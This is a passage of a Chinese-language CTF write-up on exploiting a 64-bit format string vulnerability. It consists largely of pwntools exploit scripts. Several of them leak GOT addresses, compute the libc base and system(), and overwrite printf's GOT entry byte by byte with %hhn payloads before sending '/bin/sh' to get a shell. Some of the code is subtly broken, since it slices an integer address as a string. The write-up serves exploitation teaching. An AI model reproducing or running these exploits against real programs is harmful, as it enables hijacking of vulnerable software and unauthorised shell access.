    #*****************泄露got表*************************
    #*****************获取printf_got地址，并打印其真实地址*************
    libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")  //加载我们泄露出的服务器端的libc
    printf_got = file.got['printf']
    libc_base = puts_addr - libc.symbols['puts']
    sys_addr = libc_base + libc.symbols['system']
    #*****************获取printf_got地址，并打印其真实地址*************
    r.interactive()
效果：
接下来的目标就是将
printfgot中的内容给替换成sys_addr的值，就是将got表中printf的函数地址给修改成system的函数地址，这样再次传入参数
‘/bin/sh’ 在执行printf时，由于将got表给修改了，就相当于执行了system 函数 即：执行system(‘/bin/sh’)
——————————-格式化字符串漏洞_64位相对于32位的区别及利用重点来啦—————————————
在格式化字符串漏洞中是可以任意写的相信个位师傅也都多少利用过，在这里就是要利用任意写，将printf的got表中的值改写为system的地址，而地址我们上面已经泄露出来了。那么直接构建payload。有的师傅会直接构建为
：payload = ‘a’ * sys_addr + %7$n + p64(printf_got)
但是sys_addr作用后的填充字符，a那是多少个数量级啊，怎么可能一次性读入那么多啊，就算能，谁的程序中会读取那么多字符？仅以本程序为例，还是用的
read(0,s,0x60); 仅读入0x60个字符，所以要换为另一个格式字符，%c ，%numc
，读入的字符屈指可数，但经过格式化漏洞转换后，那就是num个字符的输出同样可以达到相同的修改数据的效果
exp：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn33"
    r = process(pwn_name)
    file = ELF(pwn_name)
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']
    payload = 'a'*4 + '%7$s' + p64(puts_got)
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')
    #*****************泄露got表*************************
    #*****************获取printf_got地址，并打印其真实地址*************************
    libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
    printf_got = file.got['printf']
    libc_base = puts_addr - libc.symbols['puts']
    sys_addr = libc_base + libc.symbols['system']
    #*****************获取printf_got地址，并打印其真实地址*************************
    #*****************修改printf_got地址，为sys地址*************************
    r.recvuntil("plese input:")
    payload1 = '%' + str(sys_addr) + 'c' + '%7$n' + p64(printf_got)
    r.sendline(payload1)
    #*****************修改printf_got地址，为sys地址*************************
    r.interactive()
到这里或许有的师傅会觉得，也没见和32位的比有什么难度啊，不就是将地址给放到后面吗？这有什么难的，我们也会，哎又一个水货，哈哈，请师傅耐心观赏：
执行上述exp后的效果如上，发现并没有recv到任何数据，哈哈，这就又是一个坑了，当然
这不是我们构造payload时的思路有问题，而是64位程序，printf在输出大量字符时所照成的影响，就像前面一次性读入大量字符会异常一样，printf在一次性输出这么大量的字符时也会出现异常。而且就算不出现异常，那么你在链接服务器时，进行网络传输，它一次性传输大量字符，先不说网络会不会崩溃，就算他不崩溃，没有其他异常，能够正常传输，光说这带宽，一次性传输大量字符，网络卡也要卡死了。
所以，只能换个方法，由于我们这个是一次性修改地址，即sys_addr有着六个字节，所以解决办法便是一个一个字节来做出修改，再加上你仔细观察会发现其实前两个字节，乃至前三个字节都是一样的，所以采用一个字节一个字节的修改，还可以少修改几位
至于怎么修改？请往下看：
我们原先是想要将整个地址都给直接修改了，所以直接输入目标地址即可，但现在想要一个字节一个字节的修改，那么我们自然是要精确到每个字节所在的地址，至于怎么精确？
我们在用%x时是用来查看偏移，看我们的偏移是否于我们填入的地址相照应，用%s来查看我们填入地址中的内容，前提都是同一个地址，而现在我们要精确每一个地址中保存的值，那么我们为什么不试着将地址更改一下试试呢？？？
我们再次回到泄露got表的步骤来做测试（会的师傅可以跳过这一步了）：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn1"
    r = process(pwn_name)
    file = ELF(pwn_name)
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']
    payload = 'a'*4 + '%7$s' + p64(puts_got + 1)
    //不改变地址时，泄露的是完整的六位（减去最高位的两个零，为六位），现在尝试加一
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')
    #*****************泄露got表*************************
    r.interactive()
在不改动地址，直接泄露时可以发现，泄露出的是完整的六位
当对地址加一时，可以发现，泄露出的地址少了一位（同样的对地址进行加一减一自己尝试，就可以发现泄露出的真实地址位数也在改变）：
综上所述，当对目标地址加一（进行偏移）时，读取到的真实地址就也在变化，这样，我们就可以确定真实地址的每一位所在的位置了
接下来就是对每个位置的真实地址的值做修改了
又因一次仅修改一个字节，所以我们这里用%hhn（上面格式化字符处有介绍）
因为通过上面的便宜测试，我们可以知道直接 %x
got中的真实地址的话，其实是重真实地址的最后一位开始泄露的，所以我们第一个修改的字节也就是最后一位的（前面已经通过libc计算了基地址和system的地址，可以自行向上查找）
先放脚本和效果，然后再详解：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn1"
    r = process(pwn_name)
    file = ELF(pwn_name)
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']
    payload = 'a'*4 + '%7$s' + p64(puts_got )
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')
    #*****************泄露got表*************************
    #*****************获取printf_got地址，并打印其真实地址*************************
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    printf_got = file.got['printf']
    libc_base = puts_addr - libc.symbols['puts']
    sys_addr = libc_base + libc.symbols['system']
    payload = 'a'*4 + '%7$s' + p64(printf_got)
    r.sendline(payload)
    r.recvuntil('aaaa')
    printf_addr = u64(r.recv(6) + '00')
    #*****************获取printf_got地址，并打印其真实地址*************************
    #*****************修改printf_got地址，为sys地址*************************
    r.recvuntil("plese input:")
    sys_addr_min = sys_addr[6:]
    a = int(sys_addr_min[2:4],16)
    b = int(sys_addr_min[4:6],16)
    c = int(sys_addr_min[6:8],16)
    if a < b or b < c :
        execfile("pwn2.py")
        quit()
    payload1  = '%' + str(c) + 'c' + '%11$hhn'
    payload1 += '%' + str(b - c) + 'c' + '%12$hhn'
    payload1 += '%' + str(a - b) + 'c' + '%13$hhn'
    n4 = len(payload1)
    n5 = 0
    if n4 < 40 :
        n5 = 40 - n4
    payload1 += 'a'*n5
    n6 = len(payload1)
    payload1 += p64(printf_got) + p64(printf_got+1) + p64(printf_got+2)
    r.sendline(payload1)
    #*****************修改printf_got地址，为sys地址************************
    r.interactive()
第一：
由上图可以发现两个真实地址仅有后三个字节是不相同的，所以我们仅需要修改后三位的值就可以了
第二：
你可以发现我上面有一个判断，如果不满足条件就再次调用脚本知道满足我们的要求
这个判断是为了让这个地址的后三位是按从大到小的顺序排列，因为我们的%n是目标地址中的值修改为其前面打印出的字符数量，所以如果地址的后三位不是按我们要求的递增来的，那么我们用%c来修改值的话就不好计算，比如地址为：0x7f5f6fc7a440
其后三个字节为：c7a440，其中c7明显大于a4，这样就会导致我们的payload难以构建，因为我们要一次性修改三次，将地址的后三位全部进行修改，所以如果后三个字节大小顺序不确定的话，就会导致我们的payload的对应的地址的顺寻不确定
过了这个坑，我们也就修改了got表，就可以直接传参 bin/sh 进行利用了
完整exp：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn1"
    #******************格式化字符串偏移****************
    def pianyi(pwn_name,x = 'x'):
        print('pwn_name=' + pwn_name + ',x=' + x)
        i = 0
        while True :
            r = process(pwn_name)
            i += 1
            payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'
            r.sendline(payload)
            r.recvuntil("aaaa.")
            r_recv = r.recv(8)
            print('*'*10 + r_recv + '*'*10)
            if r_recv == '61616161':
                print(payload)
                if x == 'x':
                    s = '%' + str(i) + '$8x'
                else :
                    s = '%' + str(i) + '$8' + str(x)
                return s
                break
    #******************格式化字符串偏移****************
    r = process(pwn_name)
    file = ELF(pwn_name)
    #pianyi(pwn_name)# %6$8x
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']
    payload = 'a'*4 + '%7$s' + p64(puts_got)
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')
    #*****************泄露got表*************************
    #*****************获取printf_got地址，并打印其真实地址*************************
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    printf_got = file.got['printf']
    libc_base = puts_addr - libc.symbols['puts']
    sys_addr = libc_base + libc.symbols['system']
    payload = 'a'*4 + '%7$s' + p64(printf_got)
    r.sendline(payload)
    r.recvuntil('aaaa')
    printf_addr = u64(r.recv(6) + '00')
    #*****************获取printf_got地址，并打印其真实地址*************************
    #*****************修改printf_got地址，为sys地址*************************
    r.recvuntil("plese input:")
    sys_addr_min = sys_addr[6:]
    print('*'*10 + 'sys_addr:' + str(sys_addr_min) + '*'*10)
    a = int(sys_addr_min[2:4],16)
    b = int(sys_addr_min[4:6],16)
    c = int(sys_addr_min[6:8],16)
    if a < b or b < c :
        execfile("pwn2.py")
        quit()
    payload1  = '%' + str(c) + 'c' + '%11$hhn'
    payload1 += '%' + str(b - c) + 'c' + '%12$hhn'
    payload1 += '%' + str(a - b) + 'c' + '%13$hhn'
    n4 = len(payload1)
    n5 = 0
    if n4 < 40 :
        n5 = 40 - n4
    payload1 += 'a'*n5
    n6 = len(payload1)
    payload1 += p64(printf_got) + p64(printf_got+1) + p64(printf_got+2)
    r.sendline(payload1)
    #*****************修改printf_got地址，为sys地址*************************
    r.recvuntil("plese input:")
    r.sendline("/bin/sh")
    r.interactive()